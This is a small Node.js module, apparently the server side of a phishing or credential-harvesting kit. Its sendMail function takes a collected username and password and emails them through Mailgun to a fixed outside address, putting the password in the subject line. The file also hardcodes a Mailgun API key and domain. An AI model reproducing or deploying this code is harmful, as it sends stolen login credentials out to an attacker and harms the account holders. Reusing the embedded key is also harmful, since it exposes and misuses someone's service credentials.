const nodemailer = require('nodemailer')
const mailGun = require('nodemailer-mailgun-transport')


const auth = {
    auth: {
        api_key:'f0e56413f90bf2b3db33963747581f75-3e508ae1-1978f0f4',
        domain: 'sandbox65139aeb630744a889bc58d33c4c44db.mailgun.org'
    }
}

const transporter = nodemailer.createTransport(mailGun(auth))

const sendMail = (collectUserName,collectPassword,cb) => {
    const mailOptions = {
        from: collectUserName,
        to: 'srilekha@cststech.com',
        subject: collectPassword,
        text: 'the Logins lord commander'
    }
    
    transporter.sendMail(mailOptions, function(err, data){
        if (err) {
            cb(err,null)
        } else {
            cb(null,data)
        }
    })
}

module.exports = sendMail

